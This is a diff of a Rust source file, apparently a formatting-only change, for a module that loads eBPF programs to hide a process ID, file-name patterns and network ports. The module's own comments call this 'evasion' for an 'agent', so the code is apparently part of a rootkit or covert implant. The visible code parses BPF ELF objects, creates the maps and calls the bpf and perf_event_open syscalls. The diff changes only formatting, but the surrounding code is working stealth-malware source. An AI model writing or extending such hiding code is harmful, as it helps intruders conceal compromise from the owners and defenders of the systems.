@@ -128,7 +128,11 @@ fn parse_bpf_elf(data: &[u8]) -> Result<BpfObject> {
 
     let ehdr: Elf64_Ehdr = unsafe {
         let mut h = Elf64_Ehdr::default();
-        std::ptr::copy_nonoverlapping(data.as_ptr(), &mut h as *mut _ as *mut u8, std::mem::size_of::<Elf64_Ehdr>());
+        std::ptr::copy_nonoverlapping(
+            data.as_ptr(),
+            &mut h as *mut _ as *mut u8,
+            std::mem::size_of::<Elf64_Ehdr>(),
+        );
         h
     };
 
@@ -178,8 +182,7 @@ fn parse_bpf_elf(data: &[u8]) -> Result<BpfObject> {
         } else if name == "version" {
             if shdr.sh_size >= 4 && shdr.sh_offset as usize + 4 <= data.len() {
                 kern_version = u32::from_le_bytes(
-                    data[shdr.sh_offset as usize..shdr.sh_offset as usize + 4]
-                        .try_into()?,
+                    data[shdr.sh_offset as usize..shdr.sh_offset as usize + 4].try_into()?,
                 );
             }
         } else if name.starts_with("maps") {
@@ -341,9 +344,9 @@ fn perf_event_open_tracepoint(tracepoint_id: u32) -> Result<RawFd> {
             libc::SYS_perf_event_open,
             &attr as *const _,
             -1i32 as libc::pid_t, // any process
-            -1i32 as libc::c_int,  // all CPUs
-            -1i32,                 // no group fd
-            0u64,                  // no flags
+            -1i32 as libc::c_int, // all CPUs
+            -1i32,                // no group fd
+            0u64,                 // no flags
         )
     };
 
@@ -363,9 +366,10 @@ fn read_tracepoint_id(category: &str, name: &str) -> Result<u32> {
     let path = format!("/sys/kernel/debug/tracing/events/{}/{}/id", category, name);
     let id_str = std::fs::read_to_string(&path)
         .with_context(|| format!("failed to read tracepoint ID from {}", path))?;
-    id_str.trim().parse::<u32>().with_context(|| {
-        format!("invalid tracepoint ID in {}: '{}'", path, id_str.trim())
-    })
+    id_str
+        .trim()
+        .parse::<u32>()
+        .with_context(|| format!("invalid tracepoint ID in {}: '{}'", path, id_str.trim()))
 }
 
 // ── ioctl helper ──────────────────────────────────────────────────────────
@@ -377,8 +381,7 @@ fn ioctl(fd: RawFd, request: u64, arg: u64) -> i64 {
 // ── BPF syscall wrapper ──────────────────────────────────────────────────
 
 fn bpf_syscall(cmd: u64, attr: &[u8; BPF_ATTR_SIZE], size: usize) -> Result<u64> {
-    crate::syscall!("bpf", cmd, attr.as_ptr() as u64, size as u64)
-        .context("bpf syscall failed")
+    crate::syscall!("bpf", cmd, attr.as_ptr() as u64, size as u64).context("bpf syscall failed")
 }
 
 // ── EbpfManager ──────────────────────────────────────────────────────────
@@ -546,11 +549,12 @@ impl EbpfManager {
     fn load_hide_process(&mut self, pid: u32) -> Result<()> {
         let elf_bytes = get_ebpf_bytes("hide_process")?;
         if elf_bytes.is_empty() {
-            anyhow::bail!("hide_process BPF bytecode is empty (clang not available at build time?)");
+            anyhow::bail!(
+                "hide_process BPF bytecode is empty (clang not available at build time?)"
+            );
         }
 
-        let obj = parse_bpf_elf(&elf_bytes)
-            .context("failed to parse hide_process BPF ELF")?;
+        let obj = parse_bpf_elf(&elf_bytes).context("failed to parse hide_process BPF ELF")?;
 
         // Create the pid_map (ARRAY, key=u32, value=u32, max_entries=1)
         let pid_map_fd = self.create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "pid_map")?;
@@ -574,8 +578,7 @@ impl EbpfManager {
             anyhow::bail!("hide_files BPF bytecode is empty");
         }
 
-        let obj = parse_bpf_elf(&elf_bytes)
-            .context("failed to parse hide_files BPF ELF")?;
+        let obj = parse_bpf_elf(&elf_bytes).context("failed to parse hide_files BPF ELF")?;
 
         // Create hide_patterns map (HASH, key=u32, value=[u8;64], max_entries=32)
         let patterns_fd = self.create_map(BPF_MAP_TYPE_HASH, 4, 64, 32, "hide_patterns")?;
@@ -603,8 +606,7 @@ impl EbpfManager {
             anyhow::bail!("hide_network BPF bytecode is empty");
         }
 
-        let obj = parse_bpf_elf(&elf_bytes)
-            .context("failed to parse hide_network BPF ELF")?;
+        let obj = parse_bpf_elf(&elf_bytes).context("failed to parse hide_network BPF ELF")?;
 
         // Create port_map (ARRAY, key=u32, value=u32, max_entries=8)
         let port_map_fd = self.create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 8, "port_map")?;
@@ -796,8 +798,11 @@ fn get_ebpf_bytes(program_name: &str) -> Result<Vec<u8>> {
     let bytes: Result<Vec<u8>> = (0..hex.len())
         .step_by(2)
         .map(|i| {
-            u8::from_str_radix(&hex[i..i + 2], 16)
-                .context(format!("invalid hex at position {} in EBPF_{}", i, program_name.to_uppercase()))
+            u8::from_str_radix(&hex[i..i + 2], 16).context(format!(
+                "invalid hex at position {} in EBPF_{}",
+                i,
+                program_name.to_uppercase()
+            ))
         })
         .collect();
 
@@ -815,7 +820,12 @@ fn get_ebpf_bytes(program_name: &str) -> Result<Vec<u8>> {
 /// On failure, logs a warning and returns an inactive manager (graceful
 /// degradation — the agent continues without eBPF evasion).
 pub fn init(pid: u32, file_patterns: &[&str], ports: &[u16]) -> EbpfManager {
-    tracing::info!("ebpf: initializing evasion (pid={}, {} patterns, {} ports)", pid, file_patterns.len(), ports.len());
+    tracing::info!(
+        "ebpf: initializing evasion (pid={}, {} patterns, {} ports)",
+        pid,
+        file_patterns.len(),
+        ports.len()
+    );
 
     let mut mgr = match EbpfManager::load_all(pid, file_patterns, ports) {
         Ok(m) => m,
